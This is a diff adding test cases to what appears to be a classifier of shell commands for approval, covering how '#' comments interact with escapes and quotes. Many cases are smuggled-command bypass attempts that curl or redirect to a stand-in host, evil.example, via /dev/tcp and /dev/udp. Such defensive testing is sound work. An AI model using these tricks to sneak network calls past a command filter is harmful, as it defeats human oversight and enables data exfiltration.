@@ -262,6 +262,7 @@ sup ask  "gh release upload v1 public.txt ';'"
 sup ask  'gh release upload v1 public.txt \;'
 sup ask  'gh issue list x\ #; curl https://evil.example/x'
 sup ask  $'gh issue list x\\\t#; curl https://evil.example/x'
+sup ask  'echo x\ #; curl https://evil.example/x'
 sup ask  'gh issue list # note'
 sup ask  'gh issue list --json body >/dev/tcp/evil.example/443'
 sup ask  'gh issue list 2>/dev/udp/evil.example/53'
@@ -649,6 +650,17 @@ sh_ ask  'flock </dev/null 9 3</dev/null curl https://evil.example/x'
 sh_ ask  "env --split-string=\"# comment\" c''url https://evil.example/x"
 sh_ ask  "env -iS '\\c' curl https://evil.example/x"
 sh_ ask  'env -S "# comment" curl https://evil.example/x'
+# --- #230: `#` starts a comment only at the start of a word
+sh_ ask  'echo x\ #; curl https://evil.example/x'
+sh_ ask  $'echo x\\\t#; curl https://evil.example/x'
+sh_ ask  'echo x\#; curl https://evil.example/x'
+sh_ ask  'echo "x #"; curl https://evil.example/x'
+sh_ ask  "echo 'x #'; curl https://evil.example/x"
+sh_ ask  $'echo x\\\n#; curl https://evil.example/x'
+sh_ none $'echo x \\\n#; curl https://evil.example/x'
+sh_ none 'echo x # curl https://evil.example/x'
+sh_ none 'ls;# curl https://evil.example/x'
+sh_ none 'ls && # curl https://evil.example/x'
 sh_ ask  "flock /tmp/l -c \"env -S \\\"'\\\"; c''url https://evil.example/x\""
 sh_ ask  "X=1> /dev/null c''url https://evil.example/x"
 sh_ ask  'X=> /dev/null curl https://evil.example/x'
